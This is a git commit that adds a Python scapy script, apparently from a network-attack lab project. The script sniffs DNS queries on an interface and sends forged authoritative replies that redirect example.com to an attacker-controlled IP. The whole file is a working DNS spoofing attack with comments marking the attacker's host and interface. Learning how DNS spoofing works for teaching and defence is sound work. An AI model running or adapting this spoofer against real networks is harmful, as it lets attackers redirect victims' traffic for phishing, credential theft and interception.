0f35eb6450204b921704cd71b8c08b4a84387db6
ilincasoti <ilinca.sotirescu1@gmail.com>
2026-01-15 14:55:48 +0100

    First draft of DNS spoofing added

---
+++ src/dns/dns_spoofer.py
@@ -0,0 +1,46 @@
+from scapy.all import *
+import netifaces
+
+# -----------------------
+# Configuration
+# -----------------------
+
+FAKE_DOMAIN = b"example.com."
+FAKE_IP     = "10.0.0.50"     # Attacker or fake web server
+INTERFACE   = "eth0"          # Attacker interface
+
+# -----------------------
+# DNS Spoofing Function
+# -----------------------
+
+def spoof_dns(packet):
+    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
+        qname = packet[DNS].qd.qname
+
+        if FAKE_DOMAIN in qname:
+            print(f"[+] Spoofing DNS for {qname.decode()}")
+
+            spoofed_pkt = (
+                IP(dst=packet[IP].src, src=packet[IP].dst) /
+                UDP(dport=packet[UDP].sport, sport=53) /
+                DNS(
+                    id=packet[DNS].id,
+                    qr=1,      # response
+                    aa=1,
+                    qd=packet[DNS].qd,
+                    an=DNSRR(
+                        rrname=qname,
+                        ttl=10,
+                        rdata=FAKE_IP
+                    )
+                )
+            )
+
+            send(spoofed_pkt, verbose=False)
+
+# -----------------------
+# Start Sniffing
+# -----------------------
+
+print("[*] DNS spoofing started")
+sniff(filter="udp port 53", iface=INTERFACE, prn=spoof_dns)
